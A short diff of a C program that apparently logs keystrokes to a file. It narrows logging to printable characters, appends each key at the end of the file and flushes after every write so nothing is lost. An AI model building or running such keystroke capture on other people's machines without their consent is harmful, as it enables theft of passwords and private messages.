@@ -107,7 +107,7 @@ int main() {
                         i=0;
                 }
             }
-            if (ch>8 && ch<255) writeToFile(fileHandler,ch);
+            if (ch>31 && ch<128) writeToFile(fileHandler,ch);
             if (ch==K_BACKSPACE) writeToFile(fileHandler,K_CHARBSPACE);//Backspace
      }
      if (strcmp(charcombination,EXITKEY)==0){
@@ -141,7 +141,9 @@ long writeToFile(FILE * fileHandler, char ch) {
 
   //Read char by char
   if(fileHandler != NULL) {
+     fseek(fileHandler, 0, SEEK_END);
      fprintf(fileHandler, "%c",ch);
+     fflush(fileHandler); //to avoid pre-buffering
   }
   return byteCount;
 }
@@ -159,4 +161,3 @@ if (*fileHandler != NULL){
 }
 return ok;
 }
-
